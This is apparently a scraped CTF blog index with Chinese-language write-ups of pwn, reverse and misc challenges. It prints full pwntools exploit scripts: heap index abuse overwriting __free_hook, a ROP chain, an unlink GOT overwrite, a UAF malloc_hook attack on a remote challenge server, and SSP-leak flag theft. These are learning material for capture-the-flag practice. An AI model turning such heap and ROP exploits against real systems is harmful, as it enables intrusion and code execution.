cs:_bss.bss:0000000000202020 ;org 202020h.bss:0000000000202020 assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing.bss:0000000000202020 public stdout@@GLIBC_2_2_5.bss:0000000000202020 ; FILE stdout.bss:0000000000202020 stdout@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:0000000000000490↑o.bss:0000000000202020 ; my_init+54↑r.bss:0000000000202020 ; Alternative name is ‘stdout’.bss:0000000000202020 ; Copy of shared data.bss:0000000000202028 align 10h.bss:0000000000202030 public stdin@@GLIBC_2_2_5.bss:0000000000202030 ; FILE stdin.bss:0000000000202030 stdin@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:00000000000004A8↑o.bss:0000000000202030 ; my_init+36↑r.bss:0000000000202030 ; Alternative name is ‘stdin’.bss:0000000000202030 ; Copy of shared data.bss:0000000000202038 align 20h.bss:0000000000202040 public stderr@@GLIBC_2_2_5.bss:0000000000202040 ; FILE *stderr.bss:0000000000202040 stderr@@GLIBC_2_2_5 dq ? ; DATA XREF: LOAD:00000000000004C0↑o.bss:0000000000202040 ; my_init+72↑r.bss:0000000000202040 ; Alternative name is ‘stderr’.bss:0000000000202040 ; Copy of shared data.bss:0000000000202048 completed_6962 db ? ; DATA XREF: do_global_dtors_aux↑r.bss:0000000000202048 ; do_global_dtors_aux+29↑w.bss:0000000000202049 align 4.bss:000000000020204C public single_num.bss:000000000020204C single_num dd ? ; DATA XREF: singledog+17↑r.bss:000000000020204C ; singledog+9B↑r ….bss:0000000000202050 public lucky_num.bss:0000000000202050 lucky_num dd ? ; DATA XREF: luckydog+17↑r.bss:0000000000202050 ; luckydog+E2↑r ….bss:0000000000202054 align 20h.bss:0000000000202060 public two.bss:0000000000202060 ; _QWORD two[80].bss:0000000000202060 two dq 50h dup(?) ; DATA XREF: singledog+8C↑o.bss:0000000000202060 ; edit_singledog+3D↑o ….bss:00000000002022E0 public one.bss:00000000002022E0 ; _QWORD one[80].bss:00000000002022E0 one dq 50h dup(?) ; DATA XREF: luckydog+D3↑o.bss:00000000002022E0 ; edit_luckydog+3D↑o ….bss:00000000002022E0 _bss ends1234因此在`edit_singledog`时，可以利用越界的下标，把luckydog当做singledog进行edit。edit_singledog： v2 = readfsqword(0x28u); puts(“which?”); v1 = read_int(“which?”); if ( two[v1] ) { puts(“Oh,singledog,changing your name can bring you good luck.”); read(0, (void *)two[v1], 0x20uLL); printf(“new name: %s”, two[v1]); } else { puts(“nothing here”); } return readfsqword(0x28u) ^ v2;12由于之前的结构差异，此时会输出的是buf的地址，即之前申请的堆地址，但是最低的一个字节是被我们edit过的，但是因为取的是堆基址，所以无关紧要。堆地址是页对齐的，一页的大小为4k，所以`&amp;0xfffffffff000`取堆的基地址。 edit_single((0x2e0-0x60)/8,”\\x00”)io.recvuntil(“new name: “)heap_base = (u64(io.recv(6).ljust(8,’\\x00’))&amp;0xfffffffff000)1类似地，可以使用负数作为下标，leak出`__dso_handle`的值，同时`__dso_handle`的值就是它的地址，所以可以得到程序的基地址。 edit_single((0x08-0x60)/8,”\\x08”)io.recvuntil(“new name: “)proc_base = (u64(io.recv(6).ljust(8,’\\x00’))-0x202008)12之后就可以`edit_singledog`把luckydog中的buf改为two[0]，这样再次`edit_luckydog`时，就能修改two[0]为bss段的`stderr`地址，之后再次`edit_singledog`，就能leak出`stderr`地址。 edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))edit_lucky(0,”**“,p64(proc_base+elf.sym[‘stderr’]))edit_single(0,”\\x80”)io.recvuntil(“new name: “)libc_base = (u64(io.recv(6).ljust(8,’\\x00’)))-libc.sym[‘_IO_2_1_stderr_’]12345关于libc的版本，出题人说可以尝试摸索发现程序存在tcache机制，随后判断libc版本为2.26或2.27，不过我现在对tcache还不是很了解……之后再次类似地将luckydog中的buf改为freehook的地址，修改freehook为system函数，再想办法让free时参数为/bin/sh即可。exp(照抄人人人师傅)： from pwn import *elf = ELF(“./apwn.dms”)libc = ELF(“/lib/x86_64-linux-gnu/libc-2.27.so”)io = process(“./apwn.dms”,env={“LD_PRELOAD”:”/lib/x86_64-linux-gnu/libc-2.27.so”})def choice(c): io.sendlineafter(“&gt;&gt;\\n”,str(c))def single(name): choice(1) io.sendafter(“Name:\\n”,name)def lucky(name,cp_name): choice(2) io.sendafter(“Name\\n”,name) io.sendafter(“your partner’s name\\n”,cp_name)def edit_single(idx,new_name): choice(3) io.sendlineafter(“which?”,str(idx)) io.sendafter(“Oh,singledog,changing your name can bring you good luck.\\n”,new_name)def edit_lucky(idx,new_name,new_cp_name): choice(4) io.sendlineafter(“which?”,str(idx)) io.sendafter(“Oh,luckydog,What is your new name?\\n”,new_name) io.sendafter(“your partner’s new name\\n”,new_cp_name)def save_single(): choice(5) lucky(“0000”,”0001”)single(“0000”) edit_single((0x2e0-0x60)/8,”\\x00”)io.recvuntil(“new name: “)heap_base = (u64(io.recv(6).ljust(8,’\\x00’))&amp;0xfffffffff000)success(“HEAP BASE -&gt; %#x”%heap_base) edit_single((0x08-0x60)/8,”\\x08”)io.recvuntil(“new name: “)proc_base = (u64(io.recv(6).ljust(8,’\\x00’))-0x202008)success(“PROC BASE -&gt; %#x”%proc_base) edit_single((0x2e0-0x60)/8,p64(proc_base+elf.sym[‘two’]))edit_lucky(0,”**“,p64(proc_base+elf.sym[‘stderr’]))edit_single(0,”\\x80”)io.recvuntil(“new name: “)libc_base = (u64(io.recv(6).ljust(8,’\\x00’)))-libc.sym[‘_IO_2_1_stderr_’]success(“LIBC BASE -&gt; %#x”%libc_base) edit_lucky(0,”echo X;/bin/sh\\x00”,p64(libc_base+libc.sym[‘__free_hook’]))edit_single(0,p64(libc_base+libc.sym[‘system’]))lucky(“/bin/sh\\x00”,”/bin/sh\\x00”)save_single()io.interactive()`","categories":[],"tags":[]},{"title":"某stack-4","slug":"某stack-4","date":"2019-03-19T14:45:19.000Z","updated":"2019-03-19T15:13:09.663Z","comments":true,"path":"2019/03/19/某stack-4/","link":"","permalink":"http://yoursite.com/2019/03/19/某stack-4/","excerpt":"一道静态编译的栈题，利用ROPgadget构造ropchain。","text":"一道静态编译的栈题，利用ROPgadget构造ropchain。 只开了NX保护。 可以发现如果v6的值也就是计算次数足够大的时候，使用功能5就可以产生栈溢出，但是要注意的是这里ida显示的v5的地址是ebp-0x34，但事实上调试来看，这个地址是错误的。 这里可以看见ebp的地址是FF80A888，我调试时输入的计算结果3次都是0xA0，可以知道v5的地址是FF80A84C，是ebp-0x3c,所以覆盖到返回地址所需要的偏移为0x3c+4，覆盖所需要的计算次数是16次。 为了获取shell，使用了ROPgadget生成rop链。 ROPgadget --binary stack-4. ropchain 因为这个程序构造ropchain只能四个字节四个字节地构造，所以把ropgadget提供的ropchain拆解一下，自己手动构造，需要注意的是’/bin’和’//sh’转换成数字时需要注意大小端序。 123&apos;nib/&apos;=0x6e69622f&apos;hs//&apos;=0x68732f2fp=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781] 另外由于完成构造后还需要进行计算一次才能完成覆盖，所以计算次数为16+len(p)+1。 最终脚本： 1234567891011121314151617181920212223from pwn import *sh=process(&apos;./stack-4.&apos;)elf=ELF(&apos;./stack-4.&apos;)p=[0x0806ed0a,0x080ea060,0x080bb406,0x6e69622f,0x080a1dad,0x0806ed0a,0x080ea064,0x080bb406,0x68732f2f,0x080a1dad,0x0806ed0a,0x080ea068,0x08054730,0x080a1dad,0x080481c9,0x080ea060,0x0806ed31,0x080ea068,0x080ea060,0x0806ed0a,0x080ea068,0x08054730,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x0807b75f,0x08049781]sh.recvuntil(&quot;calculate:&quot;)sh.sendline(str(16+len(p)+1))for i in range(16): sh.recvuntil(&quot;result\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;0&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&apos;0&apos;)for i in range(len(p)): sh.recvuntil(&quot;result\\n&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(&quot;0&quot;) sh.recvuntil(&quot;:&quot;) sh.sendline(str(p[i]))sh.recvuntil(&apos;result\\n&apos;)sh.sendline(&apos;5&apos;)sh.interactive()","categories":[],"tags":[]},{"title":"2014 HITCON stkof","slug":"2014-HITCON-stkof","date":"2019-03-19T02:41:13.000Z","updated":"2019-03-23T02:34:30.732Z","comments":true,"path":"2019/03/19/2014-HITCON-stkof/","link":"","permalink":"http://yoursite.com/2019/03/19/2014-HITCON-stkof/","excerpt":"一道简单的unlink题，CTFWIKI上解释的很清楚。","text":"一道简单的unlink题，CTFWIKI上解释的很清楚。 运行程序发现没有任何提示性文字，只能直接ida分析了。 输入1，malloc一个自己指定大小但有限制的空间，并把这个空间的首地址存在bss段的0x602140上的s数组里。 输入2，可以编辑*s[i]，并且此处有溢出。 输入3，可以free掉s[i]，free后指针置零，不存在UAF。 输入4，调用一个没什么用的函数，输出\\\\TODO或...。 由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。为了防止对之后的操作产生影响，可以先输入1执行一次，把缓冲区先申请完毕再进行操作。 首先分配三个chunk： 1add(0x100) 完成申请缓冲区 add(0x30) 修改这个chunk来覆盖下一个chunk add(0x80) free这个chunk完成unlink 进行unlik： 12payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90)edit(2,len(payload),payload) delete(3) edit完之后修改的chunk为： 10x0000000000000000 0x0000000000000030 0x0000000000602138 0x0000000000602140 0x0000000000000000 0x0000000000000000 0x0000000000000030 0x0000000000000090 此时free下一个chunk，就会向前与刚刚修改的chunk合并。 同时： 12*(fakeFD + 0x18) = fakeBK*(fakeBK + 0x10) = fakeFD 最终效果就是*(0x602150)==0x602138 此时s[2]=&amp;s[0],edit(2)就可以对s[0]进行更改： 1payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;]) edit(2, len(payload), payload) 再edit(1)就可以修改free的got表： 1payload = p64(elf.plt[&apos;puts&apos;]) edit(0, len(payload), payload) 现在调用free时实际调用的就是puts。 1sh.sendline(&apos;3&apos;) sh.sendline(&apos;1&apos;) puts_add=u64(sh.recv()[:6]+&apos;\\x00\\x00&apos;) libc_base=puts_add-0x06f690 这样就可以leak出libc基址（由于没有给libc文件，我事先leak了两个函数地址自己找了libc版本。） 根据偏移得到system函数地址，并修改atoi的got表： 1system=libc_base+0x045390 edit(2,8,p64(system)) 现在调用atoi时实际调用的就是system。 程序在选择功能时就会调用atoi，并且参数可以任意输入，输入/bin/sh\\x00就可以获取shell。 最终脚本： 1from pwn import * sh=process(&apos;heap-1.&apos;) elf=ELF(&apos;heap-1.&apos;) def add(size): sh.sendline(&apos;1&apos;) sh.sendline(str(size)) sh.recvuntil(&apos;OK\\n&apos;) def edit(index, size, content): sh.sendline(&apos;2&apos;) sh.sendline(str(index)) sh.sendline(str(size)) sh.send(content) sh.recvuntil(&apos;OK\\n&apos;) def delete(index): sh.sendline(&apos;3&apos;) sh.sendline(str(index)) sh.recvuntil(&apos;OK\\n&apos;) s=0x602140 add(0x100) add(0x30) add(0x80) payload=p64(0)+p64(0x30)+p64(s+16-0x18)+p64(s+16-0x10)+p64(0)+p64(0)+p64(0x30)+p64(0x90) edit(2,len(payload),payload) delete(3) payload = &apos;a&apos; * 8 + p64(elf.got[&apos;free&apos;]) + p64(elf.got[&apos;puts&apos;]) + p64(elf.got[&apos;atoi&apos;]) edit(2, len(payload), payload) payload = p64(elf.plt[&apos;puts&apos;]) edit(0, len(payload), payload) sh.sendline(&apos;3&apos;) sh.sendline(&apos;1&apos;) puts_add=u64(sh.recv()[:6]+&apos;\\x00\\x00&apos;) libc_base=puts_add-0x06f690 system=libc_base+0x045390 edit(2,8,p64(system)) sh.sendline(&apos;/bin/sh\\x00&apos;) sh.interactive()","categories":[],"tags":[]},{"title":"CONFidence2019-oldschool","slug":"CONFidence2019-oldschool","date":"2019-03-17T11:17:47.000Z","updated":"2019-03-17T11:52:46.130Z","comments":true,"path":"2019/03/17/CONFidence2019-oldschool/","link":"","permalink":"http://yoursite.com/2019/03/17/CONFidence2019-oldschool/","excerpt":"一道8086汇编题。","text":"一道8086汇编题。 不知道还会开放多久的比赛地址。 运行一波程序，结合汇编进行分析，8086汇编不是很会，看了很久才看出程序大概是个什么逻辑。 程序一开始会让我们输入，输入的字符仅限于十六进制中存在的字符。当输入到达18个时就会终止输入并开始输出，同时题目给了我们一个flag.txt，里面的字符跟输出的是差不多的。所以猜测我们输入正确的flag就会打印出和flag.txt中一样的内容。 flag.txt的内容： 12345 4 &#123;4pp p &#123;k4&#123; E p 44p&#123; p 4 p S 又读了很久汇编后，发现输出的字符是以seg000:000~0a1的值为index，对p4{krule_ctf}取值输出的。 不妨对flag.txt的内容进行替换一下。 12345 2 3211 1 3423 E 1 2213 1 2 1 S 仔细分析一下程序发现其实这是一个一笔画或者说迷宫，S是起点，E是终点。数字代表着要走到这个地方的次数，输入的每两位会控制走四步，并且只能斜着走，不过不会超过边界，例如从第一行的3的位置往右上走，只会往右移一格。 知道了规则之后就很简单了，手动走了一下得到了正确的输入，但是却不是正确的flag，阅读题目要求发现输入的ascii码转字符之后要满足p4{[0-9a-z]+}，所以开始3个最后一格ascii码值是固定的，中间的ascii码值也有范围要求。 以q代表向左上，w代表向右上，a代表向左下，s代表向右下，找到了一条满足要求的路径：qqswqwsqsaswwqawwqswwaawaqsqawawwssw 这条路径所需的输入为：70347b61716932667d 转字符串得到：p4{aqi2f} 一开始没有注意题目的要求，很久没能找到正确的flag，并且也不会编程根据这个图寻找flag，只能手动找路径。比赛结束了一会才找到（说不定正确）的flag，属实弟弟行为。","categories":[],"tags":[]},{"title":"CGCTF-note","slug":"CGCTF-note","date":"2019-03-13T15:19:00.000Z","updated":"2019-03-26T14:26:51.331Z","comments":true,"path":"2019/03/13/CGCTF-note/","link":"","permalink":"http://yoursite.com/2019/03/13/CGCTF-note/","excerpt":"入门堆题，没入门的我看了很久才弄出来。","text":"入门堆题，没入门的我看了很久才弄出来。 简单分析一个简单的note程序： 1234561.add2.show3.edit4.delete5.exitchoice&gt;&gt; 通过ida分析发现没有堆溢出，但是delete的时候指针没有置零，存在UAF。 开启了pie，所以大致思路是泄漏出libc的真实地址然后修改malloc_hook来执行onegadget。 泄漏libc真实地址先分配两个smallchunk，然后delete第一个，其fd和bk指针就会指向main_arena+88，此时因为UAF，使用show功能就可以得到main_arena+88的真实地址。 通过main_arena+88在libc文件中的偏移，就可以得到libc的真实基址。 修改malloc_hook在调用malloc函数时，程序会对malloc_hook进行检查，如果不为0，就会调用malloc_hook指向的函数，借此调用onegadget。 fastbin是一个单链表，其fd指针会指向下一个可分配的chunk。利用UAF修改掉最后并进fastbin中的chunk的fd指针，使其指向任意地址，这样之后第二次malloc出的chunk就会出现在任意地址上，从而实现任意地址写。 但是在malloc之前，程序会对要分配的地址进行检查，如果没有对应size的chunk，就不会在此处分配，所以要对这个地址进行构造，利用gdb查看内存了解如何构造。 最终exp1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *#sh=process(&quot;./note3&quot;)sh=remote(&quot;45.76.173.177&quot;,6666)elf=ELF(&quot;./note3&quot;)def add(size,content): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size:&quot;) sh.sendline(str(size)) sh.recvuntil(&quot;Content:&quot;) sh.sendline(content)def show(index): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;2&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index))def edit(index,content): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;3&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index)) sh.sendline(content)def delete(index): sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&quot;Index:&quot;) sh.sendline(str(index))add(136,&apos;aaaaaaaaabcdefgh&apos;)add(136,&apos;&apos;)delete(0)show(0)libc_base=u64(sh.recv(6).ljust(8,&apos;\\x00&apos;))-0x397b00-88onegadget=libc_base+0xd694fmalloc_hook=libc_base+0x397b00-0x10add(96,&apos;\\x22&apos;*16)delete(2)edit(2,p64(malloc_hook-0x23))add(96,&apos;&apos;)add(96,&apos;\\x00&apos;*19+p64(onegadget))sh.recvuntil(&quot;choice&gt;&gt;&quot;) sh.sendline(&quot;1&quot;) sh.recvuntil(&quot;Size:&quot;) sh.sendline(&apos;1&apos;)sh.interactive() 本地process会错误退出，但是remote的话就能成功拿到shell，不知道为啥呢orz","categories":[],"tags":[]},{"title":"调用64位代码的32位程序逆向","slug":"32位程序调用64位代码","date":"2019-03-11T16:43:20.000Z","updated":"2019-03-14T12:32:36.209Z","comments":true,"path":"2019/03/12/32位程序调用64位代码/","link":"","permalink":"http://yoursite.com/2019/03/12/32位程序调用64位代码/","excerpt":"教程","text":"教程 关于如何从32位程序中dump出64位函数，我就不赘述了，上面的文章已经说的很详尽了。 dump出的64位函数（大致意义上重命名了一些函数，可能有错误）： 对{}中内容的check是以方程组的形式，这里使用了z3求解得到答案： 1234567891011121314151617181920212223from z3 import *a1=[BitVec(&apos;a1%d&apos;%i,8) for i in range(11)]solver=Solver()solver.add(a1[4] ^ a1[2] ^ a1[6] == 119)solver.add((a1[1] ^ a1[0] ^ a1[3]) == 54)solver.add(a1[10] + a1[3] == 85)solver.add(a1[2] + a1[9] == 219)solver.add(a1[4] + a1[5] == 158)solver.add(a1[2] + a1[1] + a1[5] == 196)solver.add(a1[8] + a1[7] + a1[9] == 194)solver.add(a1[5] + a1[3] + a1[9] == 190)solver.add(a1[6] + a1[2] + a1[8] == 277)solver.add(a1[10] + a1[1] + a1[7] == 124)solver.add(a1[5] == 48)solver.add(a1[10] == 53)solver.add(a1[7] ^ a1[6] ^ a1[8] == 96)if solver.check() == sat: m = solver.model() s=[] for i in range(11): s.append(m[a1[i]].as_long())print &apos;&apos;.join([chr(i) for i in s])# 1&apos;m n0t 4n5 因为存在异或操作，所以定义变量时使用了BitVec。 1parallels@parallels-vm:~$ &apos;/home/parallels/64-32-1.&apos; input_code: hwbctf&#123;1&apos;m n0t 4n5&#125; you got it 做完了才发现这道题和最开始的链接里说的是一道题2333","categories":[],"tags":[]},{"title":"2018网鼎杯pwn-GUESS","slug":"2018网鼎杯pwn-GUESS","date":"2019-03-04T14:26:04.000Z","updated":"2019-03-04T15:19:04.079Z","comments":true,"path":"2019/03/04/2018网鼎杯pwn-GUESS/","link":"","permalink":"http://yoursite.com/2019/03/04/2018网鼎杯pwn-GUESS/","excerpt":"hint: libc基址泄露+flag泄露","text":"hint: libc基址泄露+flag泄露 开启了canary保护 IDA观察一波： 发现输入flag的地方有栈溢出，并且运行了一下发现一共可以输入3次，同时因为有fork的操作，所以即使第一次输入触发了canary，之后仍然可以进行第二第三次输入。 这里利用SSP Leak就可以泄漏libc基址和flag了。 触发canary后，程序会以%s输出__libc_main_argv[0]，可以通过栈溢出覆盖到这个位置的，从而泄漏出想要泄漏的东西。 使用gdb对程序进行调试，很方便就能得到该位置： __libc_main_argv[0]=0x7fffffffdde8 在gets函数后下断点，对栈进行观察，找到输入在栈中的位置： 这里我输入的是随便打的tyuio input=0x7fffffffdcc0 所以需要的填充为：0x7fffffffdde8-0x7fffffffdcc0=296 不知道libc版本的话，三次栈溢出貌似不太够用，所以我先泄漏了两个libc函数地址，手动找到了libc版本。 123456from pwn import * sh=process(&quot;./GUESS&quot;) elf=ELF(&quot;./GUESS&quot;) puts_got=elf.got[&quot;puts&quot;]start_got=elf.got[&quot;__libc_start_main&quot;]sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(puts_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) puts_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(puts_add)sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(start_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) start_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;)print hex(start_add) 一开始接受地址的时候，recv了8个字节，结果出了问题，从上面的栈图中也可以发现，64位程序内存的地址貌似最多只有6个字节，因此接受6个字节，再加2个\\x00就可以了。 运行得到两个libc函数的地址： 通过网站在线查询可以得到libc版本（其实也可以用LibcSearcher这个库，但最近重装虚拟机还没弄好）： 得到基址：libc_base=puts_add-0x06f690 为了泄漏flag，还要知道栈的地址。 libc里有*environ指针指向栈地址，所以可以通过这个指针泄漏栈地址。 在刚刚的网站可以查到_environ与libc基址之间的偏移。 1environ_add=libc_base+0x3c6f38 sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(environ_add)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) stack_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) 得到了栈地址之后，只要知道flag在栈中的偏移，就可以泄漏flag。 通过gdb查看栈地址： 计算flag在栈中偏移： 0x7fffffffddf8-0x7fffffffdc90=360 最终exp： 1from pwn import * sh=process(&quot;./GUESS&quot;) elf=ELF(&quot;./GUESS&quot;) puts_got=elf.got[&quot;puts&quot;] sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(puts_got)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) puts_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) libc_base=puts_add-0x06f690 environ_add=libc_base+0x3c6f38 sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(environ_add)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) stack_add=u64(sh.recv(6)+&quot;\\x00\\x00&quot;) sh.recvuntil(&apos;Please type your guessing flag&apos;) sh.sendline(&quot;a&quot;*296+p64(stack_add-360)) sh.recvuntil(&apos;*** stack smashing detected ***: &apos;) flag=sh.recvuntil(&quot;&#125;&quot;) print flag 运行结果： 1parallels@parallels-vm:~$ python guess.py [+] Starting local process &apos;./GUESS&apos;: pid 22240 [*] &apos;/home/parallels/GUESS&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) [*] Process &apos;./GUESS&apos; stopped with exit code 0 (pid 22240) flag&#123;just4eriri&#125;","categories":[],"tags":[]},{"title":"安恒杯2019年2月月赛","slug":"安恒杯2019年2月月赛","date":"2019-02-24T10:02:04.000Z","updated":"2019-02-24T10:11:50.069Z","comments":true,"path":"2019/02/24/安恒杯2019年2月月赛/","link":"","permalink":"http://yoursite.com/2019/02/24/安恒杯2019年2月月赛/","excerpt":"鶸只写了crypto，misc，re各一道题orz","text":"鶸只写了crypto，misc，re各一道题orz cpp这题加密啥的倒是不难，就是要找比对的字符串有点不知道去哪找，除了一个“Please input:”就啥也找不到了。 后来从头再来了一遍，发现了奇怪的地方： “Please input:”上面有一个’g’和’0’，点进去看了一会发现一个函数比较后会打印’g00d’，一路按x往前，最后终于找到了需要比对的字符串“”access denieda””。 解密脚本： 123456789101112s=&quot;access denieda&quot;temp=[]for i in range(len(s)): temp.append(ord(s[i])^i)for i in range(len(temp)): if i%3==0: temp[i]^=0x1f if i%3==1: temp[i]^=0x20 if i%3==2: temp[i]^=0x21print &apos;&apos;.join([chr(i) for i in temp]) 解密出来的字符串也不是很明显…然而md5之后交了一下发现对了2333 hahaha题目下载了一个压缩包，提示需要密码。 发现压缩包里有4个6字节的txt和一个flag.pdf。 以前看过类似的题目，利用crc32爆破出txt的内容，就是压缩包的密码，然后解密得到flag.pdf： 看图可知需要继续爆破，把字符全排列一下，然后sha1后等于给的值就行了。 一开始沙雕了爆破了很久都没得到flag,后来才想起来flag应该是有格式的，所以shift键只能用在1或2上，加了格式之后秒出结果： 1234567891011121314151617181920import hashlibvisit = [True, True, True, True, True, True, True]temp = [&quot;&quot; for x in range(0, 7)]def dfs(position): if position == len(arr): string=&apos;&apos;.join(temp) flag=&quot;flag&#123;&quot;+string+&quot;&#125;&quot; if hashlib.sha1(flag).hexdigest()==&apos;e6079c5ce56e781a50f4bf853cdb5302e0d8f054&apos;: print flag return for index in range(0,len(arr)): if visit[index] == True: temp[position] = arr[index] visit[index] = False dfs(position + 1) visit[index] = True arr = [&quot;1&quot;,&quot;@&quot;,&apos;s&apos;,&apos;e&apos;,&apos;h&apos;,&apos;c&apos;,&apos;n&apos;]dfs(0) 来玩个游戏吧第一关一开始就知道是可以用网站解密的了,然而想了半天不知道该怎么把那个盲文拖下来orz。 后来拖下来之后解压出了一个32位字符串,前两位是??。 猜测是前两位不知道的md5，突发奇想加了个10上去就成功解密出hello，第一关就过了。 第二关需要两个md5相同的文件，我用了fastcoll得到了这样的文件。 最后的邮件： 1送你一封包含flag的邮件： Dear Professional ; Especially for you - this cutting-edge intelligence ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our club . This mail is being sent in compliance with Senate bill 2216 , Title 9 ; Section 306 ! THIS IS NOT MULTI-LEVEL MARKETING . Why work for somebody else when you can become rich as few as 35 weeks . Have you ever noticed more people than ever are surfing the web and people will do almost anything to avoid mailing their bills . Well, now is your chance to capitalize on this ! WE will help YOU decrease perceived waiting time by 120% &amp; decrease perceived waiting time by 140% . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Minnesota tried us and says &quot;I was skeptical but it worked for me&quot; . We assure you that we operate within all applicable laws . Because the Internet operates on &quot;Internet time&quot; you must act now ! Sign up a friend and your friend will be rich too . Warmest regards . Dear Cybercitizen , We know you are interested in receiving red-hot announcement ! We will comply with all removal requests ! This mail is being sent in compliance with Senate bill 1619 ; Title 2 ; Section 301 . This is NOT unsolicited bulk mail ! Why work for somebody else when you can become rich within 53 MONTHS ! Have you ever noticed more people than ever are surfing the web and more people than ever are surfing the web . Well, now is your chance to capitalize on this . We will help you use credit cards on your website plus decrease perceived waiting time by 150% . The best thing about our system is that it is absolutely risk free for you ! But don&apos;t believe us ! Mrs Simpson of Washington tried us and says &quot;Now I&apos;m rich, Rich, RICH&quot; . We assure you that we operate within all applicable laws ! We beseech you - act now ! Sign up a friend and your friend will be rich too . Thank-you for your serious consideration of our offer ! Dear Friend ; This letter was specially selected to be sent to you ! If you no longer wish to receive our publications simply reply with a Subject: of &quot;REMOVE&quot; and you will immediately be removed from our mailing list . This mail is being sent in compliance with Senate bill 2716 , Title 2 ; Section 306 ! This is a ligitimate business proposal . Why work for somebody else when you can become rich inside 33 weeks . Have you ever noticed more people than ever are surfing the web plus more people than ever are surfing the web . Well, now is your chance to capitalize on this ! WE will help YOU SELL MORE and process your orders within seconds . You can begin at absolutely no cost to you . But don&apos;t believe us ! Mrs Jones of Kentucky tried us and says &quot;I was skeptical but it worked for me&quot; ! This offer is 100% legal ! We implore you - act now . Sign up a friend and you&apos;ll get a discount of 50% . God Bless . 一开始百度栅格密码，啥也百度不到，甚至以为这是栅栏密码试了半天，后来科学上网用google搜了一下，很容易就找到了解密网站。 ……等待dalao们的wp","categories":[],"tags":[]},{"title":"HGAME2019-Say-Muggle-Code a.k.a. SMC","slug":"HGAME2019-Say-Muggle-Code-a-k-a-SMC","date":"2019-02-11T17:34:36.000Z","updated":"2019-03-12T05:20:33.947Z","comments":true,"path":"2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/","link":"","permalink":"http://yoursite.com/2019/02/12/HGAME2019-Say-Muggle-Code-a-k-a-SMC/","excerpt":"首先SMC，使用python脚本：","text":"首先SMC，使用python脚本： 12345678i=0x603000key=123while 1: PatchByte(i,Byte(i)^key) i+=1 key+=1 if i == 0x603200: break 要求输入的flag长度为39，并且格式为hgame{}。 同时把括号内的内容分为两半，前面一半用check1检验，后面一半用check2检验。 check1: 每个字符异或0xe9后与data1比较，所以可以直接逆运算： 1234567891011121314151617data1=[0xDE,0xD1,0xD8,0x8C,0x8F,0xD9,0xDF,0xDE,0xDF,0x8C,0xD8,0xDA,0x8C,0xDC,0xDD,0xD8,]print &apos;&apos;.join([chr(i^0xe9) for i in data1]) 结果为781ef0676e13e541。 check2: 12345678910111213141516171819202122_DWORD *__fastcall encrypt(__int64 a1, _DWORD *a2)&#123; _DWORD *result; // rax int v3; // [rsp+10h] [rbp-10h] signed int i; // [rsp+14h] [rbp-Ch] signed int j; // [rsp+18h] [rbp-8h] v3 = 0; for ( i = 0; i &lt;= 31; ++i ) &#123; result = (_DWORD *)0x9E3779B9LL; v3 -= 0x61C88647; for ( j = 0; j &lt;= 3; j += 2 ) &#123; *(_DWORD *)(a1 + 4LL * j) = *(_DWORD *)(4LL * j + a1) + ((*(_DWORD *)(4 * (j + 1LL) + a1) + v3) ^ (16 * *(_DWORD *)(4 * (j + 1LL) + a1) + *a2) ^ ((*(_DWORD *)(4 * (j + 1LL) + a1) &gt;&gt; 5) + a2[1])); result = (_DWORD *)(4 * (j + 